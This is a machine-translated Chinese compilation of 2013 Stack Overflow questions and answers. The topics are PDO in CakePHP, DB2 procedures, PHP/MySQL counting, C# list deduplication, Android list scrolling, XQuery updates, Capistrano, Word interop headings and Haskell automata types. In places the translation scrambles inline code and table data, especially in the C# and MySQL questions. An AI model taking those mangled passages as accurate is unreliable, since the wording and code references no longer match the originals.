我已经让主机提供商重新安装 pdo_mysql.so 但这没有帮助。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-20T14:48:19.530

我的猜测是，这与[我遇到的问题](https://stackoverflow.com/questions/11421213/this-auth-login-creates-correct-query-that-returns-1-row-but-fails-if-chec/11525014#11525014)相似。

**回答：**

> 据我们的服务器小哥说，“加载PDO有两种方法。第一种是使用easyapache安装PDO php扩展。第二种是通过PECL安装PDO。看起来有问题的模块不同。”
> 
> 显然，这台服务器上有 PECL，而不是普通的 easyapache PDO。当他删除它并使用easyapache PDO重新启动/重置它时，一切都很好。
> 
> 所以 - 听起来像 CakePHP 需要“正常”的 PDO。
> 
> 谜团已揭开。

（我把它贴在这里而不是把它称为重复，因为它不是一个真正的重复问题——我只是认为它有相同的答案）

# database - db2 存储过程 - 使用默认 null 会产生错误

> ID：14977787
> 
> 赞同：0
> 
> 时间：2013-02-20T10:39:08.497
> 
> 标签：database, stored-procedures, db2

考虑以下过程：

```
 CREATE PROCEDURE XYZ.ABC
                      (
                         IN V1 DATE,
                         IN V2 VARCHAR(50) DEFAULT NULL
                      )
    SPECIFIC XYZ.ABC
    RESULT SETS 1
    MODIFIES SQL DATA
    NOT DETERMINISTIC
    NULL CALL
    LANGUAGE SQL EXTERNAL ACTION
    INHERIT SPECIAL REGISTERS
BEGIN
        DECLARE temp_cursor CURSOR WITH HOLD WITH RETURN TO CALLER
        FOR
        select
        //long query
        where  ((V2 is not null AND V2='abc') OR (V2 is null));
        OPEN temp_cursor;
END
; 
```

这给了我错误

> 在“V2 VARCHAR(50)”之后发现了一个意外的标记“DEFAULT NULL”。预期的标记可能包括：“”。第 4 行。SQLSTATE=42601

我不明白为什么 DEFAULT NULL 在这种情况下不起作用。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-08T05:53:24.563

好像是版本问题。DB2 v9.5 不支持默认关键字。

# php - PHP while 循环中的 MySQL 查询在第一个结果后返回 NULL

> ID：14977788
> 
> 赞同：1
> 
> 时间：2013-02-20T10:39:08.287
> 
> 标签：php, mysql

我有一些 mysql 表（每个容器一个）（例如，该表称为 containerA）：

```
Box_ID Box_Name Box_Distributor 容器 Box_state
======---========---================---==========-- --=========
1 箱 1 交货 Comp.1 ContainerA Full
2 盒 2 交付 Comp.2 ContainerA 空
3 Box 3 NULL ContainerA 丢失

```

我有另一个带有容器列表的 mysql 表：

```
container_id 容器名称
============---===============
1个
2乙

```

我想向网页报告容器的名称和空框的数量。

我写了这个来做到这一点：

```
 $v1 = 0;
    $sql = "select * from containers";
    $result = mysql_query ($sql) or die(mysql_error());
    while ($row = mysql_fetch_array($result)) 
    { 
        $containers[] = $row[container_name];
        $containerid[] = $row[container_id];

    }

    while ($v1 < 14)
    {

        $containerend = $containers[$v1];
        $containerstart = "container";
        $containername = $containerstart.$containerend;

        $sql = "SELECT COUNT(*) FROM `$containername` WHERE state = 'Empty';";
        $result = mysql_query($sql) or die(mysql_error());
        $count = mysql_fetch_array($result);
        var_dump($containers[$v1]);
        var_dump($count[$v1]);
        $v2 = $v1 + 1;
        $v1 = $v2;

    } 
```

它可以列出容器名称，但它只给我空框的第一个结果，数组的其余部分返回为 NULL：

```
字符串(1) "4" NULL NULL NULL NULL NULL NULL NULL NULL NULL NULL NULL NULL NULL NULL

```

我在这里做傻事吗？当然，while 循环中的 SQL 查询应该返回每个容器的计数？

任何帮助表示赞赏。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-20T13:41:13.567

$count 本质上只是一个值（因为您正在计算单个容器），因此它适用于第一个元素，但不适用于后续元素。快速修复是使用 mysql_result：

```
$count = mysql_result($result, 0); 
```

与以往一样，此代码使用的 mysql 函数既不安全又将被弃用 - 请考虑切换到 mysqli 或 pdo。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-20T10:40:37.617

改变这个

```
while ($row = mysql_fetch_array($result)) 
{ 
    $containers[] = $row[container_name];
    $containerid[] = $row[container_id];

} 
```

至

```
while ($row = mysql_fetch_array($result)) 
{ 
    $containers[] = $row['container_name'];
    $containerid[] = $row['container_id'];

} 
```

你错过了`'`。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-20T13:46:12.857

> 我在这里做傻事吗？

是的。

在多个表中拆分相同的数据确实很愚蠢。

```
$sql = "select * from containers";
...
while ($v1 < 14)
{
   ...
   $sql = "SELECT COUNT(*) FROM `$containername` WHERE state = 'Empty';"; 
```

关系数据库管理系统非常擅长执行连接。程序/面向对象语言不是。

如果你所有的 containerX 表都在一个表中，那么性能会更好，代码也会更简单。在聚合表上创建类似于单个表的视图是微不足道的，从而避免了立即重写大部分代码。

为什么要获取所有容器然后只处理前 14 个？

$v2 在做什么？

由于您的描述与您的代码不匹配，因此很难弄清楚为什么您的代码行为不端 - 您的查询状态为“WHERE state = 'Empty'”，但您的表描述没有名为 state 的列（如果这是一个准确的报告，那么代码将在第一次迭代时停止并显示 MySQL 错误消息）。

# c# - 从 List<> 中删除重复项并记录重复数量

> ID：14977794
> 
> 赞同：0
> 
> 时间：2013-02-20T10:39:30.507
> 
> 标签：c#, algorithm

我有一个`List<Item>`. 有`Item`属性`Id`和。此列表中有重复的项目。我需要得到一个新的，它只包含非重复的s和 in应该是它在 first 中重复的次数。我尝试了类似的东西`Name``Amount``List<Item>``Item``Item``Amount``List<Item>`

```
 for (int i = 0; i < list.Count; i++)
            {
                for (int j = 0; j < list.Count; j++)
                {
                        if (list[i].Name == list[j].Name)
                        {
                            list.Remove(prod.Components[j]);
                            list[i].Amount++;
                        }
                }
            } 
```

但是这个循环存在一些问题。我的大脑过热了。请帮忙。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-20T10:45:17.767

一个简单的 LINQ 查询可以让您获得唯一项目以及它们出现的次数：

```
var distinct = list.GroupBy(o => o.Name)
                   .Select(g => new { Count = g.Count(), Item = g.First() })
                   .ToList(); 
```

然后你可以修改每个项目的`Amount`重复数：

```
foreach (var row in distinct)
{
    row.Item.Amount = row.Count;
} 
```

最后取回`List<Item>`不包含重复项且数量正确的 a：

```
var uniqueItems = distinct.Select(r => r.Item).ToList(); 
```

**重要提示：**上面的代码假定“重复”项彼此无法区分，但没有其他区别（例如，它不需要`Item`具有默认构造函数）。根据具体情况，可以将其写成更短的形式。

此外，该`Amount`物业在这里看起来很奇怪。由于重复项不保证其金额的总和，那么 的目的是`Item.Amount`什么？我会假设数量为 2 的重复项目应该导致一个数量为 4 的项目，但是您的代码没有这样做（我的代码遵循该领先）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-20T10:44:43.973

在我的头顶上（还没有测试过）：

```
list.GroupBy(x => x.Name)
    .Select(x => new Item {
                            Name = x.Key,
                            Amount = x.Count()
                          })
    .ToList(); 
```

您尚未指定 Id 会发生什么，所以我忽略了它们。

（注意这会创建一个新列表，而不是修改原始列表）。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-20T10:52:25.487

尝试这样的事情：

```
var groups = from item in items
             group item by item.Property
             into grouped
             select grouped;

var distinct = from g in groups
               let item = g.First()
               let amount = g.Count()
               select new Item {Property = item.Property, Amount = amount}; 
```

之后`distinct`包含`IEnumerable<Item>`原始项目列表中的数量。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-02-20T10:53:29.273

假设您通过前两个属性`ID`和确定重复项`Name`。

您可以实现一个`IEqualityComparer<Item>`并将其用于`Enumerable.GroupBy`：

```
var itemAmounts = items.GroupBy(i => i, new Item())
    .Select(g => new Item { 
        ID = g.First().ID, 
        Name = g.First().Name, 
        Amount = g.Count()
    }); 
```

这是您的 Item 类，具有以下有意义的实现`IEqualityComparer<Item>`：

```
class Item : IEqualityComparer<Item>
{
    public int ID;
    public string Name;
    public int Amount;

    public bool Equals(Item x, Item y)
    {
        if (x == null || y == null) return false;

        bool equals = x.ID == y.ID && x.Name == y.Name;
        return equals;
    }

    public int GetHashCode(Item obj)
    {
        if (obj == null) return int.MinValue;

        int hash = 19;
        hash = hash + obj.ID.GetHashCode();
        hash = hash + obj.Name.GetHashCode();
        return hash;
    }
} 
```

您也可以覆盖`Equals`and `GetHasdhCode`from `object`，那么您根本不需要自定义比较器`GroupBy`：

```
var itemAmounts = items.GroupBy(i => i)
    .Select(g => new Item { 
        ID = g.First().ID, 
        Name = g.First().Name, 
        Amount = g.Count()
    }); 
```

您可以使用上面已经可用的方法：

```
public override bool Equals(object obj)
{
    Item item2 = obj as Item;
    if (item2 == null)
        return false;
    else
        return Equals(this, item2);
}

public override int GetHashCode()
{
    return GetHashCode(this);
} 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-02-20T10:53:32.443

```
foreach(var item in list)
{
    if(list.Count(e=>e.Id == item.Id && e.Name == item.Name)!=1)
    {
        list.Remove(item);
    }
} 
```

# android - 列表滚动滞后

> ID：14977796
> 
> 赞同：0
> 
> 时间：2013-02-20T10:39:38.613
> 
> 标签：android, listactivity, smooth-scrolling

我的应用程序是一个包含 26 行的**列表活动**，每行都包含图像和文本，每件事都运行良好，但列表的滚动显示了一些滞后，尤其是当滚动它的速度与默认的 android 联系人列表一样平滑时，它并不平滑，

我试过了 ：`lv.setFastScrollEnabled(true);`

还尝试减小每行中的图像大小，直到我用 ic_launcher 图像替换所有图像以进行测试，但存在相同的滞后。

但这对平滑我的列表滚动没有任何影响，任何建议或帮助将不胜感激。 **注意：** 以阿拉伯语命名的类。

**我的代码：**

**菜单类：**

```
 public class Menu extends ListActivity {
   String classes[] = { "المقدمة", "رحلتي", "اليوم الأول",  "اليوم الثاني", "اليوم الثالث", 
         "اليوم الرابع", "اليوم الخامس", "اليوم السادس", "اليوم السابع", "اليوم الثامن", "اليوم التاسع", "اليوم العاشر", "اليوم الحادي عشر", 
         "اليوم الثاني عشر", "اليوم الثالث عشر", "اليوم الرابع عشر", "اليوم الخامس عشر", "اليوم السادس عشر", "اليوم السابع عشر", 
         "اليوم الثامن عشر", "اليوم التاسع عشر", "اليوم العشرون", "اليوم الحادي والعشرين", "اليوم الثاني والعشرين", "اليوم الثالث والعشرين", "الخاتمة"};

@Override
protected void onCreate(Bundle savedInstanceState) {
    this.requestWindowFeature(Window.FEATURE_NO_TITLE); 
    // TODO Auto-generated method stub
    super.onCreate(savedInstanceState);
    // create background for whole list as image 
    ListView lv = getListView(); 
    lv.setFastScrollEnabled(true);   
    lv.setCacheColorHint(0);  
    lv.setDivider(new ColorDrawable(0xFFDAB999));
    lv.setSelector(android.R.color.transparent); 
    lv.setDividerHeight(10);
    lv.setPadding(50, 0, 50, 0);
    lv.setVerticalScrollBarEnabled(false);
    lv.setBackgroundResource(R.drawable.a);

    setListAdapter(new MyArrayAdapter(this, classes));  }

@Override
protected void onListItemClick(ListView l, View v, int position, long id) {
    // TODO Auto-generated method stub
    super.onListItemClick(l, v, position, id);
    String cheese = classes[position];
    if(cheese.equals("المقدمة")) cheese = "Introduction"; 
    if(cheese.equals("رحلتي")) cheese = "MyTrip"; 
    if(cheese.equals("اليوم الأول")) cheese = "Day1"; 
    if(cheese.equals("اليوم الثاني")) cheese = "Day2"; 
    if(cheese.equals("اليوم الثالث")) cheese = "Day3";
    if(cheese.equals("اليوم الرابع")) cheese = "Day4"; 
    if(cheese.equals("اليوم الخامس")) cheese = "Day5"; 
    if(cheese.equals("اليوم السادس")) cheese = "Day6";
    if(cheese.equals("اليوم السابع")) cheese = "Day7"; 
    if(cheese.equals("اليوم الثامن")) cheese = "Day8"; 
    if(cheese.equals("اليوم التاسع")) cheese = "Day9";
    if(cheese.equals("اليوم العاشر")) cheese = "Day10"; 
    if(cheese.equals("اليوم الحادي عشر")) cheese = "Day11"; 
    if(cheese.equals("اليوم الثاني عشر")) cheese = "Day12";
    if(cheese.equals("اليوم الثالث عشر")) cheese = "Day13"; 
    if(cheese.equals("اليوم الرابع عشر")) cheese = "Day14"; 
    if(cheese.equals("اليوم الخامس عشر")) cheese = "Day15";
    if(cheese.equals("اليوم السادس عشر")) cheese = "Day16"; 
    if(cheese.equals("اليوم السابع عشر")) cheese = "Day17"; 
    if(cheese.equals("اليوم الثامن عشر")) cheese = "Day18";
    if(cheese.equals("اليوم التاسع عشر")) cheese = "Day19"; 
    if(cheese.equals("اليوم العشرون")) cheese = "Day20"; 
    if(cheese.equals("اليوم الحادي والعشرين")) cheese = "Day21";
    if(cheese.equals("اليوم الثاني والعشرين")) cheese = "Day22"; 
    if(cheese.equals("اليوم الثالث والعشرين")) cheese = "Day23"; 
    if(cheese.equals("الخاتمة")) cheese = "Conclusion"; 

    try{
        Intent ourIntent;
       if(position>1 &&  position<25) {
               Class ourClass = Class.forName("com.tsn.dr.MyDay");
               ourIntent = new Intent(Menu.this, ourClass);
               ourIntent.putExtra("cheese", cheese);}
       else {
               Class ourClass = Class.forName("com.tsn.dr." + cheese);
               ourIntent = new Intent(Menu.this,ourClass);  }            
          startActivity(ourIntent);  }                                                                                                 
                 catch (ClassNotFoundException e){
                          e.printStackTrace();  }}

public boolean onCreateOptionsMenu(android.view.Menu menu) {

MenuInflater inflater = getMenuInflater();
inflater.inflate(R.menu.cool_menu, menu);

getLayoutInflater().setFactory(new Factory() {
public View onCreateView(String name, Context context,
AttributeSet attrs) {

if (name .equalsIgnoreCase("com.android.internal.view.menu.IconMenuItemView")) {
try {

LayoutInflater li = LayoutInflater.from(context);
final View view = li.createView(name, null, attrs);

new Handler().post(new Runnable() {
public void run() {

view .setBackgroundResource(R.drawable.border3);

((TextView) view).setTextSize(25); 

Typeface face=Typeface.createFromAsset(getAssets(),"BFantezy.ttf");     
((TextView) view).setTypeface(face);
((TextView) view).setTextColor(Color.RED);
}
});
return view;
} catch (InflateException e) {
} catch (ClassNotFoundException e) {
}
}
return null;
}
});
return super.onCreateOptionsMenu(menu);
}

@Override
public boolean onOptionsItemSelected(MenuItem item) {
    // TODO Auto-generated method stub
    switch (item.getItemId()) {
    case R.id.aboutUs:
        Intent i = new Intent("com.tsn.dr.ABOUT");
        startActivity(i);

    break;
    case R.id.preferences:
        Intent p = new Intent("com.tsn.dr.PREFS");
        startActivity(p);
    break;
    case R.id.exit:
        finish();
    break;
}
return false;
                }
         } 
```

**MyArrayAdapter 类：**

```
 public class MyArrayAdapter extends ArrayAdapter<String> {
private final Activity context;
private final String[] classes;
Typeface tf;

public MyArrayAdapter(Activity context, String[] classes) {
    super(context, R.layout.row, classes);
    this.context = context;
    this.classes = classes;
              }

@Override
public View getView(int position, View convertView, ViewGroup parent) {
    tf=Typeface.createFromAsset(context.getAssets(),"BFantezy.ttf"); 
    LayoutInflater inflater = context.getLayoutInflater();
    View rowView = inflater.inflate(R.layout.row, null, true);
    TextView textView = (TextView) rowView.findViewById(R.id.row_label);
    ImageView imageView = (ImageView) rowView.findViewById(R.id.row_image);
    String s = classes[position];
    textView.setText(s);
    ((TextView)textView).setTypeface(tf); 

if ( s.startsWith("اليوم الأول")) {

    imageView.setImageResource(R.drawable.ic_launcher); }

if ( s.startsWith("اليوم الثاني")) {

    imageView.setImageResource(R.drawable.ic_launcher); }

if ( s.startsWith("اليوم الثالث")) {

    imageView.setImageResource(R.drawable.ic_launcher); }

if ( s.startsWith("اليوم الرابع")) {

    imageView.setImageResource(R.drawable.ic_launcher); }

if ( s.startsWith("اليوم الخامس")) {

    imageView.setImageResource(R.drawable.ic_launcher); }

if ( s.startsWith("اليوم السادس")) {

    imageView.setImageResource(R.drawable.ic_launcher); }

if ( s.startsWith("اليوم السابع")) {

    imageView.setImageResource(R.drawable.ic_launcher); }

if ( s.startsWith("اليوم الثامن")) {

    imageView.setImageResource(R.drawable.ic_launcher); }

if ( s.startsWith("اليوم التاسع")) {

    imageView.setImageResource(R.drawable.ic_launcher); }

if ( s.startsWith("اليوم العاشر")) {

    imageView.setImageResource(R.drawable.ic_launcher); }

if ( s.startsWith("اليوم الحادي عشر")) {

    imageView.setImageResource(R.drawable.ic_launcher); }

if ( s.startsWith("اليوم الثاني عشر")) {

    imageView.setImageResource(R.drawable.ic_launcher); }

if ( s.startsWith("اليوم الثالث عشر")) {

    imageView.setImageResource(R.drawable.ic_launcher); }

if ( s.startsWith("اليوم الرابع عشر")) {

    imageView.setImageResource(R.drawable.ic_launcher); }

if ( s.startsWith("اليوم الخامس عشر")) {

    imageView.setImageResource(R.drawable.ic_launcher); }

if ( s.startsWith("اليوم السادس عشر")) {

    imageView.setImageResource(R.drawable.ic_launcher); }

if ( s.startsWith("اليوم السابع عشر")) {

    imageView.setImageResource(R.drawable.ic_launcher); }

if ( s.startsWith("اليوم الثامن عشر")) {

    imageView.setImageResource(R.drawable.ic_launcher); }

if ( s.startsWith("اليوم التاسع عشر")) {

    imageView.setImageResource(R.drawable.ic_launcher); }

if ( s.startsWith("اليوم العشرون")) {

    imageView.setImageResource(R.drawable.ic_launcher); }

if ( s.startsWith("اليوم الحادي والعشرين")) {

    imageView.setImageResource(R.drawable.ic_launcher); }

if ( s.startsWith("اليوم الثاني والعشرين")) {

    imageView.setImageResource(R.drawable.ic_launcher); }

if ( s.startsWith("اليوم الثالث والعشرين")) {

    imageView.setImageResource(R.drawable.ic_launcher); }

if ( s.startsWith("الخاتمة")) {

    imageView.setImageResource(R.drawable.ic_launcher); }

if ( s.startsWith("رحلتي")) {

    imageView.setImageResource(R.drawable.ic_launcher); }

if ( s.startsWith("المقدمة")) {

    imageView.setImageResource(R.drawable.ic_launcher); }

return rowView;  }} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-20T13:54:47.847

First remove `tf=Typeface.createFromAsset(context.getAssets(),"BFantezy.ttf");` line from your `getView` method and use it as a field (Which makes it reusable). You can create your `TypeFace` in `onCreate()` method for example.

And second, you are not recycling views. You are creating new row when your adapter calls `getView()` method. The proper implementation of `getView()` method is something like below:

```
@Override
public View getView(final int position, View convertView, ViewGroup parent) {
    final ViewHolder holder;
    if (convertView == null) {
        holder = new ViewHolder();
       // Inflate your row layout
        convertView = mInflater.inflate(R.layout.YOUR_XML_LAYOUT, null);
        // set your holder views here. For example;
        // holder.textview = (TextView) convertView.findViewById(R.id.textview);
        //
        convertView.setTag(holder);
    } else {
        holder = (ViewHolder) convertView.getTag();
    }
    // Customize your row items here! For example:
    // if ( s.startsWith("اليوم الثاني والعشرين")) {
    // imageView.setImageResource(R.drawable.ic_launcher); }

    return convertView;
} 
```

For more efficiency, don't use time consuming operations in `getView()` method because it will be called everytime you fling/scroll on your listview.

Hope this helps.

# xquery - XQuery 更改属性值并返回前一个

> ID：14977798
> 
> 赞同：1
> 
> 时间：2013-02-20T10:39:43.767
> 
> 标签：xquery, basex

我正在尝试更新节点的属性值并在一个查询中返回其先前的值，但我找不到解决方法。我使用[BaseX](http://basex.org/)作为我的 XML/XQuery 数据库。

现在我已经尝试过这样做：

```
/Root/Elem/properties/property[@id='17']/@format,
replace value of node /Root/Elem/properties/property[@id='17']/@format with 'URL' 
```

还有这个：

```
for $prop in /Root/Elem/properties/property[@id='17']
    let $format := $prop/@format
    return (replace value of node $prop/@format with 'URL', $format) 
```

以及其他多项测试，但它们都导致以下错误：

```
List expression: no updating expression allowed. 
```

这是 BaseX 的限制还是在 XQuery 中不可能？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-20T11:16:38.367

*XQuery Update*不允许从更新查询返回结果。但是，您可以使用 BaseX 的专有[`update:output($seq)`](http://docs.basex.org/wiki/Update_Module#update:output)功能来做到这一点：

```
for $prop in /Root/Elem/properties/property[@id='17']
let $format := $prop/@format
return (replace value of node $format with 'URL', update:output($format)) 
```

# capistrano - 如果在多服务器部署的情况下在机器上失败，如何处理 capistrano 的部署过程？

> ID：14977802
> 
> 赞同：0
> 
> 时间：2013-02-20T10:40:05.410
> 
> 标签：capistrano

我正在尝试使用有 4 个应用程序服务器的 capistrano。如果在一台机器上部署失败，我不确定 capistrano 的行为。如果一台机器的网络连接断开，那么所有机器上的进程都会进入中断睡眠状态，并且不会通知任何内容。请让我知道如何追踪此类问题。

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-26T06:02:24.897

Capistrano 有自己的事务管理，如果它在任何机器上失败，则调用 deploy:rollback 并且所有机器始终保持相同的有效状态。

# c# - Office Word 顶部标题样式未显示在目录中

> ID：14977804
> 
> 赞同：0
> 
> 时间：2013-02-20T10:40:12.673
> 
> 标签：c#, ms-word, office-interop

我正在使用 Office 的 Word 互操作构建一个 Word 文档。我正在通过代码设置标题样式。内容的样式正确，但是，打开创建的 word 文档时，没有为标题中的选择选择样式。这导致目录找不到标题。

```
object oMissing = Missing.Value;

//Start Word and create a new document.
var application = new Application();
application.Visible = true;
var document = application.Documents.Add(ref oMissing, ref oMissing, ref oMissing, ref oMissing);

foreach (var member in assembly.Members)
{
    //Insert a paragraph at the beginning of the document
    var paragraph = document.Content.Paragraphs.Add(ref oMissing);
    paragraph.set_Style(WdBuiltinStyle.wdStyleHeading1);
    paragraph.Range.Text = member.MemberName;
    paragraph.Range.InsertParagraphAfter();
}

document.TablesOfContents.Add(document.Content, true /*use heading styles*/, oMissing, oMissing, oMissing,
                                                    oMissing, oMissing, oMissing, oMissing, oMissing,
                                                    oMissing, oMissing);

document.SaveAs(@"C:\test.docx", oMissing, oMissing, oMissing, oMissing, oMissing, oMissing, oMissing, oMissing, oMissing, oMissing, oMissing);
document.Close();
application.Quit(); 
```

此示例导致目录显示“未找到条目”。

请注意，内容的样式与标题样式正确。但是，当我手动打开文档并选择“标题 1”时，目录会正确找到条目。

任何想法为什么会发生这种情况？我是带有内置样式名称的 callign set_Style。为什么它应用样式但实际上并未被视为样式（在本例中为标题）？

**更新**

添加以下代码似乎只使*第一个标题*被识别为 Word 中的标题。

```
 foreach (var member in assembly.Members)
    {
        document.ActiveWindow.Selection.set_Style(WdBuiltinStyle.wdStyleHeading1);
        //Insert a paragraph at the beginning of the document
        var paragraph = document.Content.Paragraphs.Add(ref oMissing);
        paragraph.set_Style(WdBuiltinStyle.wdStyleHeading1);
        paragraph.Range.Text = member.MemberName;
        paragraph.Range.InsertParagraphAfter();
    } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2014-10-31T10:28:52.027

I have noticed difference in the order of the operations

Follow code will not generate real header, it is only looks like header

```
/*1*/ paragraph.set_Style(WdBuiltinStyle.wdStyleHeading1);
/*2*/ paragraph.Range.Text = "Head";
/*3*/ paragraph.Range.InsertParagraphAfter(); 
```

To solve propblem you should use this code

```
/*1*/ paragraph.Range.Text = "Head";
/*2*/ paragraph.set_Style(WdBuiltinStyle.wdStyleHeading1);
/*3*/ paragraph.Range.InsertParagraphAfter(); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-08T09:54:00.300

After Adding the Paragraph select the paragraph it might work .

```
paragraph.Range().Select() 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-07-16T00:24:27.973

我不得不做类似的事情，但段落没有得到风格......

然后我使用了 TypeText，然后开始工作......我也使用了 Word.Selection。我正在合并文档，但我想您的代码应该是这样的：

（行后： var document = application.Documents.Add(ref oMissing, ref oMissing, ref oMissing, ref oMissing)）。我在 usings 上使用 Word = Microsoft.Office.Interop.Word，因此“Word”在选择与此相关之前。

```
Word.Selection selection = application.Selection;

foreach (var member in assembly.Members)
{
  selection.TypeText(member.MerberName);
  selection.set_Style(WdBuiltinStyle.wdStyleHeading1);
  selection.TypeParagraph();
} 
```

这在这里奏效了，TOC 正在被填满。

# haskell - Haskell入门问题...请向我解释

> ID：14977806
> 
> 赞同：5
> 
> 时间：2013-02-20T10:40:15.090
> 
> 标签：haskell

我应该写一些haskell程序，但我真的不知道从哪里开始。如果您能指出一些资源来阅读或解释我的问题，我将非常感激。我确信这完全是业余的，但我真的需要一个起点。

```
data DFA q o                =  DFA (q -> o -> q) q [q]
data NFA q o                =  NFA (q -> o -> [q]) [q] [q]
-- I really realy don't understand the declarations here
-- I can guess that q is somewhat related to Q and o to E, but don't get what it really means

data Q                      =  Q0 | Q1 | Q2
                               deriving (Eq, Enum, Bounded)

data E                      =  A | B

-- what does n1 do ??
n1                          :: NFA Q E
n1                          =  NFA d [Q0] [Q2] -- i see [Q0] refers to set of initial states and [Q2] refers to final states :)
                               where
                                   d Q0 A = [Q0]
                                   d Q0 B = [Q0, Q1]
                                   d Q1 _ = [Q2]
                                   d Q2 _ = []

-- the following functions are for me to write
starDFA :: Eq q => DFA q o -> [o] -> Bool
--for the above function, what are the arguments the function takes in ?
--how can we relate q with Q and [o] with [E] ?? 
```

任何对正确起点的解释或参考都会对我很有帮助。抱歉问了这么愚蠢的问题，但我真的不知道从哪里开始:)

谢谢

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2013-02-20T12:13:01.333

[向您学习 Haskell for Great Good！](http://learnyouahaskell.com/)可能是目前最好的 Haskell 教程。我建议通读整篇文章，但如果你赶时间，我会指出一些与本作业更相关的部分。

给出的代码的主要部分是`data`声明，所以一旦你熟悉了基础知识（[第 2](http://learnyouahaskell.com/starting-out)章和第 3 章的[第一部分](http://learnyouahaskell.com/types-and-typeclasses#believe-the-type)），一个很好的地方就是[代数数据类型介绍](http://learnyouahaskell.com/making-our-own-types-and-typeclasses#algebraic-data-types)、[类型变量](http://learnyouahaskell.com/types-and-typeclasses#type-variables)和[类型参数](http://learnyouahaskell.com/making-our-own-types-and-typeclasses#type-parameters)。

以上应该足以破译数据声明并理解`q`vs`Q`和`o`vs之间的关系`E`。

现在要实现实际功能，您需要熟悉[确定性有限自动机](http://en.wikipedia.org/wiki/Deterministic_finite_automaton)的工作原理，然后了解足够的 Haskell 来编写实际实现。[第 4](http://learnyouahaskell.com/syntax-in-functions)章和[第 5](http://learnyouahaskell.com/recursion)章是本教程中与此最相关的章节，您可能还会发现[有关标准库列表函数](http://learnyouahaskell.com/modules#data-list)的部分很有用。

一旦你到达这一点，如果你被实现所困，你可以用你迄今为止编写的代码发布另一个问题。

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2013-02-20T16:44:36.357

在 haskell 中，我们有三种方法来定义新类型，使用三个不同的关键字**type**、**newtype**和**data**。

在您的示例中，它是正在使用的**数据**关键字，让我们更加关注它。
最好从您的代码中最简单的开始

```
data E = A | B 
```

在这里，我们定义了一个新类型 E，它只能采用两种*模式*或*状态*或*值*。
像这样的类型就是我们所说的**sum 类型**。我们如何使用它？
主要是**模式匹配**。

```
useE :: E -> String
useE A = "This is A"
useE B = "This is B" 
```

现在，来自您的代码的更复杂的数据声明。

```
data Q =  Q0 | Q1 | Q2 deriving (Eq, Enum, Bounded) 
```

同样，如前所述，我们有一个**sum 类型**，它定义了一个新类型 Q，取三个值，Q0、Q1 或 Q2。但是我们有一个**派生子句**，它告诉编译器这个新类型实现了从**Eq, Enum, Bounded class**派生（或继承）的方法（或函数） 。那是什么意思 ？
我们来看一个函数。
想象一下，您想为 Q 的每个值关联一个数字，我们该如何执行呢？

```
enumQ :: Q -> Int
enumQ x = fromEnum x 
```

如果您想更深入地了解**deriving**子句提供的此特定功能，请阅读已指示的资源并尝试ghci 下的**:info Enum 。**请注意，以前的类型也可以派生自同一个类。由于这些类型被完全描述为一组可枚举值的总和（由**|**区分），我们更好地理解了为什么我们称它们为**sum 类型**。

最后是最困难的数据声明。

```
data DFA q o =  DFA (q -> o -> q) q [q]
data NFA q o =  NFA (q -> o -> [q]) [q] [q] 
```

如果事实上它们几乎是相同的数据定义，那么我将介绍第一个，并让您分析第二个作为练习。

```
data DFA q o = DFA (q -> o -> q) q [q] 
```

这一次我们必须谈谈**数据构造函数**和**类型构造函数**。

*   在等式的左侧，有**数据构造函数**，用于构建数据并为其命名。在这一方面，我们有用于构建这些新数据的必需参数。
*   在等式的右侧，有**类型构造函数**，用于构建这个新类型。在这一方面，我们有明确的管道，它向读者展示了如何使用现有类型构建这种新类型（数据）。

现在请记住，以下是类型，

*   **[x]** ::: 表示多态列表的类型，Example, [Int] => List of Int
*   **x** ::: 一种基本类型，现有类型之一（Int、Char、String ...）
*   **x -> y** ::: 定义函数的类型，采用类型 x 产生类型 y。
*   **x -> y -> z** ::: 定义函数的类型采用类型 x 和类型 y 来产生类型 z。可以将其视为一个函数，该函数采用另一个类型为 (x->y) 的函数并产生一个类型 z。这就是我们所说的**高阶函数**。

然后我们的数据声明，放在这个上下文中，是一个**数据构造函数**，由两个类型参数**q**和**o**提供，结果，它返回一个新类型作为高阶函数的乘积，一个基本类型和一个列表类型. 这就解释了为什么我们称之为**产品类型**。

现在，您自己推断应该足以回答您的问题**n1 是什么？**

祝你好运。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2013-02-20T13:31:56.853

根据我对 Haskell 类型声明的了解，关于 DFA 和 NFA 的初始陈述是这样说的（例如，看 NFA）：（

左手边：） NFA 是一种使用两种类型（q 和 o）的类型它的建设。

（右手边：） NFA 的一个实例将被称为 NFA，由三个参数组成：
(1) "(q -> o -> [q])" ，意思是一个接受两个参数的函数，一个是类型q 和 o 类型之一，并返回 q 的列表 ([q])
(2) "[q]" ，表示一个 q
(3) "[q]" 类型的值列表，另一个值的列表类型 q

n1 似乎是 NFA 的实例构造，我们看到

```
n1                          =  NFA d [Q0] [Q2] 
```

所以我们可以推断：
(1) d 是一个函数，它接受两个参数，一个 'q' 和一个 'o' 并返回一个 q 的列表
(2) [Q0] 是一个 q 的列表，并且
(3) [ Q2] 是 q 的列表。

实际上，d 的定义如下：
d 接受两个参数，一个“Q”和一个“E”，并返回一个 Q 列表（我们知道它可以是 Q0、Q1 或 Q2）或一个空列表。

我希望这会有所帮助和/或也许有人可以澄清和纠正我的模糊理解。

# php - 包含多个依赖项的相对根问题

> ID：14977811
> 
> 赞同：0
> 
> 时间：2013-02-20T10:40:32.163
> 
